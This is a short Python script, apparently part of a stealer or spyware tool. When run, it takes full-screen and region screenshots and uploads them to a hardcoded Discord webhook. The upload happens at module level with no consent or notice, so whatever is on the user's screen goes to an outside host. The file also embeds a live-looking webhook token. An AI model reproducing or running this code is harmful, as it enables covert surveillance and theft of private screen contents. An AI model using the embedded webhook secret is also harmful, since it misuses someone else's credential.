import pyautogui
import requests
from io import BytesIO
from PIL import Image

def webscreenshot(webhook_url: str):
    """
    Takes a screenshot and sends it to the given webhook URL.
    """
    screenshot = pyautogui.screenshot()

    img_byte_arr = BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()

    files = {
        'file': ('screenshot.png', img_byte_arr, 'image/png')
    }

    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print("Screenshot sent successfully!")
    else:
        print(f"Failed to send screenshot. Status code: {response.status_code}")

def specificpositionscreenshot(coords: str, webhook_url: str):
    """
    Takes a screenshot of a specific area based on the coordinates and sends it to the given webhook URL.
    """
    x1, y1, x2, y2 = map(int, coords.split(", "))

    width = abs(x2 - x1)
    height = abs(y2 - y1)

    screenshot = pyautogui.screenshot(region=(x1, y1, width, height))

    img_byte_arr = BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()

    files = {
        'file': ('specific_screenshot.png', img_byte_arr, 'image/png')
    }

    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print("Specific position screenshot sent successfully!")
    else:
        print(f"Failed to send screenshot. Status code: {response.status_code}")

def rescalc(original_coords: str):
    """
    Adjusts the coordinates based on the user's screen resolution.
    """
    current_width, current_height = pyautogui.size()

    original_width = 1920
    original_height = 1080

    x1, y1, x2, y2 = map(int, original_coords.split(", "))

    width_scale = current_width / original_width
    height_scale = current_height / original_height

    adjusted_x1 = int(x1 * width_scale)
    adjusted_y1 = int(y1 * height_scale)
    adjusted_x2 = int(x2 * width_scale)
    adjusted_y2 = int(y2 * height_scale)

    adjusted_coords = f"{adjusted_x1}, {adjusted_y1}, {adjusted_x2}, {adjusted_y2}"
    print(f"Adjusted coordinates: {adjusted_coords}")
    return adjusted_coords

webhook_url = "https://discord.com/api/webhooks/1296834621706604648/Nr2sEUXSSWbxfVwzgk52-RBYaKNmBs--UTnRxKMf7IE7A2h-ALq-6ZrYW89fQVX52AFT"


webscreenshot(webhook_url)
coords = "425, 265, 1050, 600"
specificpositionscreenshot(coords, webhook_url)

adjusted_coords = rescalc(coords)
specificpositionscreenshot(adjusted_coords, webhook_url)
